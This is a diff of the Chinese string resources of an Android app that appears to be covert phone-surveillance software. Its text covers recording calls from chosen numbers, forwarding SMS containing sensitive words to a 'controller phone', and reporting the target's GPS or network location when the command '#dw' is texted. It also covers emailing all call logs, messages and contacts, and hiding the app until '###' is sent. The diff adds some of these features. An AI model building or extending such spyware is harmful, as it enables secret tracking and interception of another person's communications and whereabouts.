@@ -45,10 +45,12 @@
     <string name="mail_body_record">你好，这是来自%s的自动发信，附件是录音文件。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
     
     <!-- Location -->
-    <string name="location_sms_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
+    <string name="location_sms_gps_real">当前GPS位置（纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
+    <string name="location_sms_gps_hist">最近GPS位置（时间，纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
+    <string name="location_sms_network_real">网络定位当前位置（纬度，经度）：%s。去maps.google.com查看地图，精度10~500米。</string>
+    <string name="location_sms_network_hist">网络定位最近位置（时间，纬度，经度）：%s。去maps.google.com查看地图，精度10~500米。</string>
     <string name="location_sms_base_station_gsm">基站定位当前位置：%s。去maps.google.com查看地图，精度50~500米。</string>
     <string name="location_sms_base_station_cdma">基站定位当前位置（纬度，经度）：%s。去maps.google.com查看地图，精度50~500米。</string>
-    <string name="location_sms_hist">最近GPS位置（时间，纬度，经度）：%s。去maps.google.com查看地图，精度10米内。</string>
     <string name="location_sms_fail">抱歉，当前无法获得所在位置，请稍后再试。若一直无法解决请联系客服。</string>
     
     <!-- Preferences -->
@@ -61,15 +63,15 @@
     <string name="pref_category_info_collector_title">情报收集</string>
     <string name="pref_category_record_title">通话录音</string>
     <string name="pref_category_sms_redirector_key">pref_category_sms_redirector</string>
-    <string name="pref_category_sms_redirector_title">短信转发</string>
+    <string name="pref_category_sms_redirector_title">实时短信转发</string>
     <string name="pref_category_gps_key">pref_category_gps</string>
     <string name="pref_category_gps_title">获取所在地理位置</string>
     
     <string name="pref_use_self_sender_title">使用自己的GMail发信</string>
-    <string name="pref_use_self_sender_summary">如果您有自己的GMail邮箱，用它发信更有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
+    <string name="pref_use_self_sender_summary">如果您有GMail邮箱，用它发信有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
     <string name="pref_sender_mail_title">发信邮箱（仅限GMail）</string>
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
-    <string name="pref_invalid_sender_mail">警告：%s 不是一个有效的GMail邮箱地址。</string>
+    <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
     <string name="pref_recv_mail_title">收信邮箱</string>
     <string name="pref_invalid_mail_format">警告：%s 不是一个有效的邮箱地址。</string>
     <string name="pref_pls_input_pwd">请输入邮箱密码。</string> 
@@ -81,15 +83,16 @@
     <string name="pref_pls_input_target_number">请输入至少一个目标号码段（至少4位数字）</string>
     <string name="pref_record_number_summary">仅当对方号码包含目标号码段（至少4位数字）时才录音。最多支持9个号码段，用空格隔开。</string>
     <string name="pref_target_num_count_reach_max">最多支持9个号码段，用空格隔开。</string>
-    <string name="pref_target_num_format_error">错误：每个号码段至少为4位数字。</string>
+    <string name="pref_target_num_format_error">每个号码段至少为4位数字。</string>
     <string name="pref_recv_phonenum_title">主控手机号码</string>
     <string name="pref_pls_input_valid_recv_phonenum">错误：%s不是有效的手机号码。</string>
+    <string name="pref_sensitive_words_enable_title">敏感短信实时转发</string>
     <string name="pref_sensitive_words_title">敏感词（空格隔开）</string>
     <string name="pref_sensitive_words_summary">请用空格隔开每个敏感词，最多支持9个。</string>
     <string name="pref_pls_input_sensitive_words">请输入敏感词，并用空格隔开，最多支持9个。</string>
     <string name="pref_sensitive_words_count_reach_max">最多只能支持%d个敏感词，多余的将被忽略。请您重新编辑敏感词。</string>
 	<string name="pref_gps_word_title">激活词（或短句）</string>
-    <string name="pref_gps_word_summary">发送包含有该词或短句的短信到目标手机可获知其GPS位置（仅从主控手机上发送短信有效）。</string>
+    <string name="pref_gps_word_summary">发送短信#dw到被控手机可获知其位置（仅从主控手机上发送有效）。</string>
     <string name="pref_pls_input_gps_activate_word">请输入一个特殊词或短句作为GPS激活词（比如：你在哪儿）。</string>
     <string name="pref_gps_activate_word_max_len">最大长度不能超过12个汉字或24个英数字符。</string>
     <string name="pref_category_network_mode_title">网络连接</string>
@@ -100,14 +103,19 @@
     <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用自己的GMail发信，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
     
     <!-- InitActivity -->
-    <string name="init_btn_getinfo">立即获取信息</string>
+    <string name="init_btn_testrecvmail">测试邮箱</string>
+    <string name="init_btn_testrecvphone">测试主控手机</string>
     <string name="init_btn_screenshot">截图</string>
     <string name="init_btn_setting">设定</string>
     <string name="init_btn_hide">退出</string>
-	<string name="init_hint_getinfo">立即将所有通话记录，短信和联系人发至邮箱。</string>
+	<string name="init_hint_testmail">立即将所有通话记录，短信和联系人发至邮箱。</string>
+	<string name="init_hint_testphone">发送一条测试短信到主控手机。</string>
+	<string name="init_test_sms_content">来自安卓监控的测试短信。</string>
+	<string name="init_send_test_sms_ok">发送成功</string>
+	<string name="init_send_test_sms_ng">发送失败。请检查主控手机号码设置是否正确，本手机是否有信号。</string>
     <string name="init_hint_screenshot">获得当前手机截屏并发送至信箱</string>
-    <string name="init_hint_setting">设置主控邮箱和手机，敏感词，位置获取词等。</string>
-    <string name="init_hint_hide">发送注册码短信到本机，方可再次激活本对话框。</string>
+    <string name="init_hint_setting">设置主控邮箱和手机，录音号码段，敏感词等。</string>
+    <string name="init_hint_hide">发送短信###到本机，可再激活本对话框。</string>
     <string name="init_processing">处理中</string>
     <string name="init_waiting">请稍候（30秒~2分钟）...</string>
     <string name="init_collecting">正在收集信息...</string>
